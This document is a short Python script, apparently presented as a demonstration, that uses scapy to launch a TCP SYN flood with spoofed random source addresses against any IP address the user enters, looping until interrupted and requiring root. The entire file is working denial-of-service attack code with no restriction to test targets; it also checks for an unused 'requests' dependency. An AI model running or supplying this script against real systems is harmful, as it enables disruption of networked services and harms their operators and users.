#!/usr/bin/python3
# Simple TCP SYN Flood Attack Demonstration
from scapy.all import *
import random
import time
def syn_flood(target_ip):
    # Target port number (can be any common web port)
    target_port = 80
    
    try:
        while True:
            # Create source IP as a random address each time
            src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}."\
                     f"{random.randint(1,254)}.{random.randint(1,254)}"
            
            # TCP header with SYN flag set
            tcp_header = TCP(sport=random.randint(1024,65535), 
                             dport=target_port,
                             flags="S",
                             seq=random.randint(1000000,9999999))
            
            # IP layer using our random source IP
            ip_layer = IP(src=src_ip, dst=target_ip)
            
            # Send the packet without waiting for a response
            send(ip_layer/tcp_header, verbose=False)
    
    except KeyboardInterrupt:
        print("Exiting script")
def main():
    target = input("Enter target IP: ")
    print(f"Starting SYN flood against {target}")
    syn_flood(target)
if __name__ == "__main__":
    if not (os.geteuid() == 0):
        sys.exit("\n[!] Please run as root")
    
    # Check for required dependencies
    try:
        import requests
    except ImportError:
        print("[!] Missing dependency: pip install requests")
    
    main()
